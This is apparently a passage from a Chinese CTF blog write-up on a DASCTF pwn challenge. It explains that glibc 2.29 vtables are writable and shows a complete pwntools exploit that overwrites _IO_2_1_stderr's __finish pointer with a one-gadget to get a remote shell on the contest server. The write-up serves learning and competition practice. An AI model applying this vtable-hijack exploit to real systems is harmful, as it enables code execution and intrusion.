<h4 id="fclose-函数调用的-vtable-函数"><a href="#fclose-函数调用的-vtable-函数" class="headerlink" title="fclose 函数调用的 vtable 函数"></a>fclose 函数调用的 vtable 函数</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/QSynPX.png" srcset="/img/loading.gif" alt></p>
<p>vtable 函数 指针：</p>
<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-comment">/* The 'finish' function does any final cleaning up of an _IO_FILE object.
   It does not delete (free) it, but does everything else to finalize it.
   It matches the streambuf::~streambuf virtual destructor.  */</span>
typedef void (*_IO_finish_t) (FILE *, <span class="hljs-built_in">int</span>); <span class="hljs-comment">/* finalize */</span>
#define <span class="hljs-constructor">_IO_FINISH(FP)</span> JUMP1 (__finish, FP, <span class="hljs-number">0</span>)
#define <span class="hljs-constructor">_IO_WFINISH(FP)</span> WJUMP1 (__finish, FP, <span class="hljs-number">0</span>)

<span class="hljs-keyword">struct</span> _IO_jump_t
&#123;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">size_t</span>, <span class="hljs-params">__dummy</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">size_t</span>, <span class="hljs-params">__dummy2</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_finish_t</span>, <span class="hljs-params">__finish</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_overflow_t</span>, <span class="hljs-params">__overflow</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_underflow_t</span>, <span class="hljs-params">__underflow</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_underflow_t</span>, <span class="hljs-params">__uflow</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_pbackfail_t</span>, <span class="hljs-params">__pbackfail</span>)</span>;
    <span class="hljs-comment">/* showmany */</span>
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_xsputn_t</span>, <span class="hljs-params">__xsputn</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_xsgetn_t</span>, <span class="hljs-params">__xsgetn</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_seekoff_t</span>, <span class="hljs-params">__seekoff</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_seekpos_t</span>, <span class="hljs-params">__seekpos</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_setbuf_t</span>, <span class="hljs-params">__setbuf</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_sync_t</span>, <span class="hljs-params">__sync</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_doallocate_t</span>, <span class="hljs-params">__doallocate</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_read_t</span>, <span class="hljs-params">__read</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_write_t</span>, <span class="hljs-params">__write</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_seek_t</span>, <span class="hljs-params">__seek</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_close_t</span>, <span class="hljs-params">__close</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_stat_t</span>, <span class="hljs-params">__stat</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_showmanyc_t</span>, <span class="hljs-params">__showmanyc</span>)</span>;
    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_imbue_t</span>, <span class="hljs-params">__imbue</span>)</span>;
&#125;;</code></pre></div>

<p>对于攻击的vtable 函数 指针其中的：</p>
<ul>
<li><code>__finish__</code></li>
<li><code>__close</code></li>
</ul>
<p>其执行顺序是先close，然后finish。由于程序给的是0x18字节的任意写，攻击 <code>__finish__</code>就可以了。</p>
<h4 id="libc2-29中的vtable"><a href="#libc2-29中的vtable" class="headerlink" title="libc2.29中的vtable"></a>libc2.29中的vtable</h4><p>vtable的值，以及其对应的函数指针，在glibc 2.29下是可写的。这个是很重要的一点，本来个人不知道这个，想了好久其他的办法来利用。</p>
<p><strong>在glibc 2.23以及glibc 2.27其都是不可写的</strong>。</p>
<p>正是因为可以写，所以这个题难度就降低了很多。</p>
<h4 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>利用程序的最后一次任意地址写，直接把<code>__IO_2_1_stderr的vtable</code>上<code>__finish__</code>指针修改为one gadget。<br>（这里的one gadget，需要自己多试）。</p>
<h5 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h5><p>第2次的2字节读入可以直接用其本来地址末2字节即可，直接在<code>__IO_2_1_stderr的vtable</code>不用转移也可以的。（看到有别的师傅转移到其他vtable地址的。）并且，由于是read函数，直接发个<code>\x60</code>一个字节即可。</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./secret'</span>
local_libc  = <span class="hljs-string">'/usr/lib/x86_64-linux-gnu/libc-2.29.so'</span>
remote_libc = <span class="hljs-string">'./libc6_2.29-0ubuntu2_amd64.so'</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = ELF(local_libc)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'183.129.189.60'</span>,<span class="hljs-number">10030</span>)
    libc = ELF(remote_libc)
elf = ELF(local_file)
<span class="hljs-comment"># libc = elf.libc</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

ru(<span class="hljs-string">"0x"</span>)
libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">"printf"</span>]
info_addr(<span class="hljs-string">"libc_base"</span>,libc_base)
ru(<span class="hljs-string">"addr"</span>)
vtable = <span class="hljs-number">0x1e5758</span> + libc_base
s(p64(vtable))
sleep(<span class="hljs-number">0.1</span>)
<span class="hljs-comment"># debug()</span>
s(<span class="hljs-string">'\x60'</span>)
sleep(<span class="hljs-number">0.1</span>)
rec = <span class="hljs-number">0xe2386</span> + libc_base
s(p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)+p64(rec))
itr()</code></pre></div>




<p>由于提前就<code>fclose(stdout)</code>,getshell以后也不会有任何的输出，所以得用<code>exec 1&gt;&amp;2</code>来恢复输出。</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/re/">re</a>
                    
                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/06/28/“第五空间” 智能安全大赛/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">“第五空间” 智能安全大赛-twice</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/05/13/House of Force/">
                        <span class="hidden-mobile">House of Force</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- LeanCloud 统计PV -->
        <span id="leancloud-site-pv-container" style="display: none">
            总访问量 
            <span id="leancloud-site-pv"></span>
             次
          </span>
      
      
        <!-- LeanCloud 统计UV -->
        <span id="leancloud-site-uv-container" style="display: none">
            总访客数 
            <span id="leancloud-site-uv"></span>
             人
          </span>
      

    
  </div>


  

  
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>







  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "DASCTF安恒月赛(6th)&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "left",
      visible: "hover",
      
      icon: "#"
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>












  

  

  

  

  

  





</body>
</html>
